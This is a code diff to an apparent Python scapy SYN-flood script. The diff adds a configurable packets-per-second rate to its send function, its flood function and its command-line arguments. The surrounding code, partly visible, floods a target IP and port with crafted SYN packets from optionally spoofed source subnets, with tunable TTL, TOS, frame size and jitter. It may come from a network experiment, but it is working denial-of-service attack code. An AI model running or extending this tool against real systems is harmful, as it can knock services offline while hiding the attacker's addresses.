@@ -16,11 +16,11 @@ from scapy.all import IP, TCP, Ether, sendpfast, get_if_hwaddr, conf
 # Minimum Ethernet+IP+TCP header size for a plain SYN (no TCP options), in bytes.
 BASE_FRAME_BYTES = 14 + 20 + 20
 
-def send_packets(packets, iface):
-    sendpfast(packets, loop=0, pps=500, iface=iface)
+def send_packets(packets, iface, pps):
+    sendpfast(packets, loop=0, pps=pps ,iface=iface)
 
 def syn_flood(target_ip, target_port, duration, ipi, window, tos, ttl,
-              frame_size, spoof_subnet, iface, jitter):
+              frame_size, spoof_subnet, iface, jitter, pps):
     """
     ipi: base inter-packet interval in seconds (e.g. 0.01 = ~100 pkt/s).
     jitter: fraction of ipi to randomize by (0 = perfectly constant rate,
@@ -58,7 +58,7 @@ def syn_flood(target_ip, target_port, duration, ipi, window, tos, ttl,
         for _ in range(10000)
     ]
 
-    p = Process(target=send_packets, args=(pkts,iface,))
+    p = Process(target=send_packets, args=(pkts,iface,pps,))
     print(f"[synflood] Start,{int(time.time())}")
     p.start()
     time.sleep(duration * 0.8)
@@ -77,6 +77,7 @@ def parse_args():
     p.add_argument("--window", type=int, default=1024)
     p.add_argument("--tos", type=int, default=0)
     p.add_argument("--ttl", type=int, default=64)
+    p.add_argument("--pps", type=int, default=500)
     p.add_argument("--frame-size", type=int, default=BASE_FRAME_BYTES,
                     help="total on-wire frame size in bytes (payload is padded to fit)")
     p.add_argument("--spoof-subnet", default=None,
@@ -91,4 +92,4 @@ if __name__ == "__main__":
     iface = args.iface or conf.iface
     syn_flood(args.target, args.port, args.duration, args.ipi, args.window,
               args.tos, args.ttl, args.frame_size, args.spoof_subnet, iface,
-              args.jitter)
+              args.jitter, args.pps)
